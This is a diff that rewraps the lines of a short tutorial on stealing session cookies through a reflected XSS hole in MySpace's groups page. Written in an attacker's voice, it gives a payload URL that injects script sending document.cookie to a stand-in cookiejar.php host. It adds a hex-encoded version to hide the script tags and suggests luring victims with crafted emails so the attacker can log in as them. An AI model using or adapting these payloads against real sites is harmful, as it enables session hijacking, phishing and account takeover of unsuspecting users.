@@ -1,6 +1,8 @@
 Cookie Theft is a simple form of session hijacking. 
 
-First the attacker needs to find an XSS hole on a popular website in order to use this exploit, in this case I found an XSS hole on Myspace which is no longer there. XSS holes can be found during the course of a web vulnerability assessment or in the course of your normal internet usage. 
+First the attacker needs to find an XSS hole on a popular website in order to use this exploit, in this case I found 
+an XSS hole on Myspace which is no longer there. XSS holes can be found during the course of a web vulnerability 
+assessment or in the course of your normal internet usage. 
 
 http://group.myspace.com/index.cfm?fuseaction=groups.myGroups&UserId=2221131&username=<script>alert("XSS Hole found!")</script>&Mytoken=20050523131629
 
@@ -13,7 +15,9 @@ Once the XSS hole has been located the malicious user then places the cookie jar
 
 Note: The URL mywebsite.com is wherever you are hosting your cookiejar.php file
 
-The script tags are then inserted into the variable which is not being properly sanitized by the offending website, in this case the Myspace groups module was not properly sanitizing the 'username' variable which was allowing javascript to be executed.
+The script tags are then inserted into the variable which is not being properly sanitized by the offending website,
+in this case the Myspace groups module was not properly sanitizing the 'username' variable which was allowing 
+javascript to be executed.
 
 http://group.myspace.com/index.cfm?fuseaction=groups.myGroups&UserId=2221131&username=<script>document.location='http://mywebsite.com/cookiejar.php?cookie='%2b encodeURI(document.cookie);</script>&Mytoken=20050523131629
 
@@ -23,8 +27,12 @@ A sophisticated attacker will then use URL obfuscation to hide the script tags
 http://group.myspace.com/index.cfm?fuseaction=groups.myGroups&UserId=2221131&username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%6D%79%77%65%62%73%69%74%65%2E%63%6F%6D%2F%63%6F%6F%6B%69%65%6A%61%72%2E%70%68%70%3F%63%6F%6F%6B%69%65%3D%27%25%32%62%20%65%6E%63%6F%64%65%55%52%49%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3B%3C%2F%73%63%72%69%70%74%3E%0A%09%09%09&Mytoken=20050523131629
 
 
-By encoding the <script> tags and inserting the URL into a carefully crafted email perhaps asking the user to click on the link above. Or by using some more sophisticated social engineering techniques the user's session can be hijacked.  
+By encoding the <script> tags and inserting the URL into a carefully crafted email perhaps asking the user 
+to click on the link above or by using some more sophisticated social engineering techniques the user's 
+session can be hijacked.  
 
-Once the user clicks on the above link, the cookiejar.php file should store the session information on the attacker's server and then you can login with the stolen credentials. 
+Once the user clicks on the above link, the cookiejar.php file should store the session information on the 
+attacker's server and then you can login with the stolen credentials. 
 
-This type of exploit requires social engineering and thus it is rated typical low-medium risk on a heat map due to the level of effort required to pull it off.
+This type of exploit requires social engineering and thus it is rated typical low-medium risk on a heat map 
+due to the extra level of effort required to pull it off.
